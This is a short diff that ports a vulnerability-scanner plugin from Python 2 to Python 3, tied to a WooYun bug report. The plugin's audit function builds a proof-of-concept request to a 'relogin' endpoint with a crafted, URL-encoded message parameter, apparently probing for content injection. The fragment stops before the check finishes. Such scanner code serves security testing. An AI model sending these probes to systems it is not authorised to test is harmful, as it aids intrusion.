@@ -3,10 +3,10 @@
 #ref:http://www.wooyun.org/bugs/wooyun-2015-0140977
 import time
 
-import urlparse
+import urllib.parse
 def assign(service, arg):
     if service == "kill_firewall":
-        arr = urlparse.urlparse(arg)
+        arr = urllib.parse.urlparse(arg)
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 def audit(arg):
     poc = arg+'index.php?action=relogin&sth=556&nickname=admin&warning=%B5%C7%C2%BC%CA%A7%B0%DC%A3%A1%D3%C3%BB%A7%C3%FB%BB%F2%C3%DC%C2%EB%B4%ED%CE%F3%A3%AC%C7%EB%C1%AA%CF%B5%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1%A3%A1%3Cbr%3ELogin+failed%21+username+or+password+error%2CPlease+contact+system+administrators%21'
